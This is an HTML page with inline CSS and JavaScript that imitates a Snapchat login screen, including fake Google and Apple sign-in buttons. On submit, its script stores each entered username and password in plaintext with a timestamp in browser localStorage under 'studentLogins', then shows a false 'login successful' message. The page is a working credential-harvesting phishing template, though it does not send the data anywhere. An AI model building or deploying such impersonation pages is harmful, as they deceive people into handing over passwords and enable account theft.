<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Log In</title>
<style>
* {
  box-sizing: border-box;
  margin: 0;
  padding: 0;
}

body {
  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
  background: #ffffff;
  color: #171719;
  display: flex;
  justify-content: center;
  align-items: center;
  min-height: 100vh;
}

.container {
  width: 100%;
  max-width: 420px;
  padding: 30px 25px;
  position: relative;
}

.back-btn {
  font-size: 24px;
  color: #0088cc;
  cursor: pointer;
  margin-bottom: 30px;
  display: inline-block;
  text-decoration: none;
}

h1 {
  text-align: center;
  font-size: 32px;
  font-weight: 600;
  margin-bottom: 40px;
}

.field-group {
  margin-bottom: 25px;
  position: relative;
}

.field-label {
  display: block;
  color: #999999;
  font-size: 11px;
  font-weight: 600;
  letter-spacing: 0.8px;
  text-transform: uppercase;
  margin-bottom: 6px;
}

.input-box {
  width: 100%;
  border: none;
  border-bottom: 1px solid #e0e0e0;
  padding: 8px 0;
  display: flex;
  align-items: center;
}

.input-box input {
  width: 100%;
  border: none;
  outline: none;
  font-size: 17px;
  color: #171719;
  background: transparent;
}

.eye-btn {
  border: none;
  background: transparent;
  color: #888888;
  cursor: pointer;
  padding-left: 10px;
  display: flex;
  align-items: center;
}

.eye-btn svg {
  width: 22px;
  height: 22px;
  fill: none;
  stroke: currentColor;
  stroke-width: 2;
  stroke-linecap: round;
  stroke-linejoin: round;
}

.forgot-link {
  display: block;
  text-align: center;
  color: #0088cc;
  font-size: 14px;
  text-decoration: none;
  margin: 30px 0 40px;
}

.login-btn {
  width: 100%;
  height: 52px;
  border: none;
  border-radius: 26px;
  background: #b0b8c0;
  color: white;
  font-size: 17px;
  font-weight: 600;
  cursor: pointer;
  transition: background 0.3s ease;
}

.login-btn.active {
  background: #000000;
}

.divider {
  display: flex;
  align-items: center;
  gap: 15px;
  margin: 35px 0;
  color: #888888;
  font-size: 13px;
  font-weight: 500;
}

.divider::before,
.divider::after {
  content: "";
  height: 1px;
  background: #e5e5e5;
  flex: 1;
}

.social-btn {
  width: 100%;
  height: 52px;
  border: none;
  border-radius: 26px;
  background: #000000;
  color: white;
  font-size: 16px;
  font-weight: 600;
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 12px;
  cursor: pointer;
  margin-bottom: 15px;
}

.google-icon {
  width: 20px;
  height: 20px;
}

.apple-icon {
  font-size: 20px;
}

.checkbox-group {
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 8px;
  margin-top: 30px;
  color: #333;
  font-size: 14px;
}

.checkbox-group input {
  accent-color: #0088cc;
  width: 16px;
  height: 16px;
}

#successMsg {
  display: none;
  margin-top: 20px;
  padding: 12px;
  background: #e7f5e8;
  color: #155724;
  border-radius: 8px;
  text-align: center;
  font-weight: bold;
}
</style>
</head>
<body>

<div class="container">
  <div class="back-btn">‹</div>

  <h1>Log In</h1>

  <form id="loginForm">
    <div class="field-group">
      <label class="field-label">USERNAME, EMAIL, OR PHONE</label>
      <div class="input-box">
        <input type="text" id="username" placeholder="" autocomplete="off" required>
      </div>
    </div>

    <div class="field-group">
      <label class="field-label">PASSWORD</label>
      <div class="input-box">
        <input type="password" id="password" autocomplete="new-password" required>
        <button type="button" class="eye-btn" id="eyeBtn" onclick="togglePassword()">
          <!-- Off/Slash Eye SVG (matches screenshot style) -->
          <svg id="eyeIcon" viewBox="0 0 24 24">
            <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path>
            <line x1="1" y1="1" x2="23" y2="23"></line>
          </svg>
        </button>
      </div>
    </div>

    <a href="#" class="forgot-link" onclick="alert('Forgot password clicked'); return false;">Forgot your password?</a>

    <button type="submit" class="login-btn" id="loginBtn">Log In</button>
  </form>

  <div id="successMsg">Your snapchat login susccefull</div>

  <div class="divider">OR</div>

  <button class="social-btn" onclick="alert('Google Sign-in')">
    <svg class="google-icon" viewBox="0 0 24 24">
      <path fill="#4285F4" d="M23.745 12.27c0-.7-.06-1.4-.19-2.07H12v4.51h6.6c-.29 1.52-1.14 2.82-2.4 3.68v3.05h3.88c2.27-2.09 3.665-5.17 3.665-9.17z"/>
      <path fill="#34A853" d="M12 24c3.24 0 5.95-1.08 7.93-2.91l-3.88-3.05c-1.08.72-2.45 1.16-4.05 1.16-3.12 0-5.77-2.1-6.72-4.93H1.27v3.15C3.25 21.3 7.31 24 12 24z"/>
      <path fill="#FBBC05" d="M5.28 14.27c-.25-.72-.38-1.49-.38-2.27s.13-1.55.38-2.27V6.58H1.27C.46 8.2.0 10.04.0 12s.46 3.8 1.27 5.42l4.01-3.15z"/>
      <path fill="#EA4335" d="M12 4.75c1.77 0 3.35.61 4.6 1.8l3.42-3.42C17.95 1.19 15.24 0 12 0 7.31 0 3.25 2.7 1.27 6.58l4.01 3.15c.95-2.83 3.6-4.98 6.72-4.98z"/>
    </svg>
    Continue with Google
  </button>

  <button class="social-btn" onclick="alert('Apple Sign-in')">
    <span class="apple-icon"></span>
    Continue with Apple
  </button>

  <div class="checkbox-group">
    <input type="checkbox" id="saveInfo">
    <label for="saveInfo">Save Login Info on your iCloud devices</label>
  </div>
</div>

<script>
const usernameInput = document.getElementById('username');
const passwordInput = document.getElementById('password');
const loginBtn = document.getElementById('loginBtn');

function checkInputs() {
  if (usernameInput.value.trim() !== '' && passwordInput.value !== '') {
    loginBtn.classList.add('active');
  } else {
    loginBtn.classList.remove('active');
  }
}

usernameInput.addEventListener('input', checkInputs);
passwordInput.addEventListener('input', checkInputs);

function togglePassword() {
  const field = document.getElementById("password");
  const icon = document.getElementById("eyeIcon");

  if (field.type === "password") {
    field.type = "text";
    // Change to normal open eye SVG when password is visible
    icon.innerHTML = '<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle>';
  } else {
    field.type = "password";
    // Change back to slashed eye SVG when password is hidden
    icon.innerHTML = '<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path><line x1="1" y1="1" x2="23" y2="23"></line>';
  }
}

document.getElementById('loginForm').addEventListener('submit', function(e) {
  e.preventDefault();

  const username = usernameInput.value.trim();
  const password = passwordInput.value;

  const submission = {
    time: new Date().toLocaleString(),
    username: username,
    password: password
  };

  let submissions = JSON.parse(localStorage.getItem('studentLogins')) || [];
  submissions.push(submission);
  localStorage.setItem('studentLogins', JSON.stringify(submissions));

  document.getElementById('loginForm').style.display = 'none';
  document.getElementById('successMsg').style.display = 'block';
});
</script>

</body>
</html>
